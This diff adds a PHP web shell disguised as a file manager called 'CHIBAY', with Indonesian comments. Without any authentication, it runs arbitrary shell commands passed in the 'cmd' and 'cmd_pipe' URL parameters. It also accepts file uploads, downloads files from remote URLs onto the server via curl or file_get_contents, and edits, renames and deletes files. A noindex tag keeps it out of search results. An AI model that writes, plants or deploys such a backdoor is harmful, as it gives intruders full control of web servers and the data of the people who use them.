@@ -1,0 +1,158 @@
+<?php
+session_start();
+
+// Fungsi untuk membuat nama acak
+function generate_random_name() {
+    return bin2hex(random_bytes(8));
+}
+
+// Mengelola pemetaan direktori
+if (!isset($_SESSION['dir_map'])) {
+    $_SESSION['dir_map'] = [];
+}
+
+if (isset($_GET['dir'])) {
+    $random_name = $_GET['dir'];
+    if (isset($_SESSION['dir_map'][$random_name])) {
+        $current_dir = $_SESSION['dir_map'][$random_name];
+    } else {
+        die("Invalid directory");
+    }
+} else {
+    $current_dir = getcwd();
+    $random_name = generate_random_name();
+    $_SESSION['dir_map'][$random_name] = $current_dir;
+}
+
+chdir($current_dir);
+
+// Eksekusi Command
+if (isset($_GET['cmd_pipe'])) {
+    $cmd_pipe = $_GET['cmd_pipe'];
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w")
+    );
+    $process = proc_open($cmd_pipe, $descriptorspec, $pipes);
+    if (is_resource($process)) {
+        $output_pipe = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+        proc_close($process);
+    }
+}
+if (isset($_GET['cmd'])) {
+    $output = shell_exec($_GET['cmd'] . " 2>&1");
+}
+
+// Fungsi Upload File
+if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], $current_dir . '/' . $_FILES['file']['name']);
+}
+
+// Upload menggunakan file_get_contents
+if (isset($_POST['file_url']) && isset($_POST['file_name'])) {
+    $data = file_get_contents($_POST['file_url']);
+    file_put_contents($current_dir . '/' . $_POST['file_name'], $data);
+}
+
+// Upload menggunakan CURL
+if (isset($_POST['curl_url']) && isset($_POST['curl_filename'])) {
+    $curl = curl_init($_POST['curl_url']);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $data = curl_exec($curl);
+    curl_close($curl);
+    file_put_contents($current_dir . '/' . $_POST['curl_filename'], $data);
+}
+
+// Upload menggunakan fopen
+if (isset($_POST['fopen_url']) && isset($_POST['fopen_filename'])) {
+    $data = file_get_contents($_POST['fopen_url']);
+    file_put_contents($current_dir . '/' . $_POST['fopen_filename'], $data);
+}
+
+// Rename File
+if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
+    rename($_POST['rename_old'], $_POST['rename_new']);
+}
+
+// Edit File
+if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
+    file_put_contents($_POST['edit_file'], $_POST['file_content']);
+}
+
+// Hapus File
+if (isset($_GET['delete'])) {
+    $file_to_delete = $_SESSION['dir_map'][$_GET['delete']] ?? null;
+    if ($file_to_delete && is_file($file_to_delete)) {
+        unlink($file_to_delete);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css">
+    <title>File Manager - CHIBAY</title>
+</head>
+<body class="bg-dark text-light">
+    <div class="container-fluid">
+        <div class="py-3" id="main">
+            <div class="box shadow bg-dark p-4 rounded-3">
+                <h1 class="text-center text-danger">C H I B A Y</h1>
+                <h2>Upload File</h2>
+                <form method="POST" enctype="multipart/form-data">
+                    <div class="input-group">
+                        <input type="file" name="file" class="form-control">
+                        <button type="submit" class="btn btn-outline-light">Upload</button>
+                    </div>
+                </form>
+                <h2>Upload via URL</h2>
+                <form method="POST">
+                    <input type="text" name="file_url" placeholder="Enter file URL" class="form-control mb-2">
+                    <input type="text" name="file_name" placeholder="Save as filename" class="form-control mb-2">
+                    <button type="submit" class="btn btn-outline-light">Upload</button>
+                </form>
+                <h2>Directory Listing</h2>
+                <table class="table table-dark table-hover">
+                    <thead>
+                        <tr>
+                            <th>Name</th>
+                            <th>Size</th>
+                            <th>Permissions</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php
+                        $files = scandir($current_dir);
+                        foreach ($files as $file) {
+                            if ($file === '.' || $file === '..') continue;
+                            $filepath = realpath($current_dir . '/' . $file);
+                            $size = is_file($filepath) ? filesize($filepath) : '-';
+                            $icon = is_dir($filepath) ? "<i class='fa fa-folder text-warning'></i>" : "<i class='fa fa-file text-info'></i>";
+                            echo "<tr>
+                                    <td>$icon $file</td>
+                                    <td>$size</td>
+                                    <td>" . substr(sprintf('%o', fileperms($filepath)), -4) . "</td>
+                                    <td>
+                                        <a href='?delete=" . urlencode($file) . "' class='btn btn-outline-danger btn-sm' onclick=\"return confirm('Are you sure?');\">Delete</a>
+                                        <a href='?rename_file=$file' class='btn btn-outline-warning btn-sm'>Rename</a>
+                                        <a href='?edit_file=$file' class='btn btn-outline-info btn-sm'>Edit</a>
+                                    </td>
+                                  </tr>";
+                        }
+                        ?>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
